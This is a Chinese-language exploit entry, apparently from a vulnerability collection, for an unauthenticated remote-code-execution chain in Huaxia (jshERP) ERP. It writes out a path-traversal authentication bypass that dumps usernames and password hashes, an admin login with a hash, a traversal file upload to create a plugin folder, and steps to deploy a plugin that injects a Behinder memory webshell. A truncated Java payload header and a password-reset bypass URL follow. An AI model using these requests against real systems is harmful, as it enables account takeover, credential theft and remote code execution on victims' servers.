# 华夏ERP全版本未授权RCE漏洞

- **系统**：华夏ERP全版本　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1`

**请求体 / payload**
```
目前最新版V3.3
通过getAllList读取用户名，密码MD5值。
使用读取得密码MD5值登录超级管理员后台。
Host: IP
Content-Length: 67
Content-Type: application/json;charset=UTF-8
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1724134392; HMACCOUNT=4FC1696FCCBA0C17; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1724138837
{"loginName":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}
超级管理员用户登陆后使用uploadPluginConfigFile接口创建../plugin目录，此目录创建后可部署插件。
Host: 172.20.10.3:3000
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------64343665641219398361207370473
X-Access-Token: 90777cf909864636a458b05de1eab2a9_0
Content-Length: 247
-----------------------------64343665641219398361207370473
Content-Disposition: form-data; name="configFile"; filename="../plugins/success.txt"
Content-Type: text/plain
success
-----------------------------64343665641219398361207370473--
后台上传插件
编写springboot-plugin-framework-parent插件。
[https://gitee.com/xiongyi01/springboot-plugin-framework-parent](https://gitee.com/xiongyi01/springboot-plugin-framework-parent)
编写冰蝎监听器，部署插件注入内存马。
package ysoserial.payloads.templates;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.Serializati…（脚本共 6444 字，完整版见原文）
```

**其他**
- 版本: [华夏ERP全版本未授权RCE及内存马注入-原创：李白你好 ](https://www.libaisec.com/68.html)
- 权限绕过重置用户密码: /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/resetPwd
{"id":63}